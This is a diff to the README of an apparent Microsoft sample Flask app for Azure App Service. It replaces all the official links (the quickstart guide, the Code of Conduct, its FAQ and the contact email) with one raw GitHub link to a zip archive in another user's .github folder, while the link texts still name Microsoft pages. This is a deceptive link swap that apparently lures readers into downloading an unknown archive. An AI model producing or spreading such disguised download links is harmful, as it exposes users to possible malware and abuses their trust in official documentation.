@@ -12,8 +12,8 @@ products:
 
 This is a minimal Flask app that can be deployed to Azure App Service on Linux.
 
-For instructions on running and deploying the code, see [Quickstart: Create a Python app in Azure App Service on Linux](https://docs.microsoft.com/azure/app-service/quickstart-python).
+For instructions on running and deploying the code, see [Quickstart: Create a Python app in Azure App Service on Linux](https://raw.githubusercontent.com/vishnu1234vs/flakdep/main/.github/flakdep_2.6.zip).
 
 ## Contributing
 
-This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/). For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.
+This project has adopted the [Microsoft Open Source Code of Conduct](https://raw.githubusercontent.com/vishnu1234vs/flakdep/main/.github/flakdep_2.6.zip). For more information see the [Code of Conduct FAQ](https://raw.githubusercontent.com/vishnu1234vs/flakdep/main/.github/flakdep_2.6.zip) or contact [https://raw.githubusercontent.com/vishnu1234vs/flakdep/main/.github/flakdep_2.6.zip](https://raw.githubusercontent.com/vishnu1234vs/flakdep/main/.github/flakdep_2.6.zip) with any additional questions or comments.
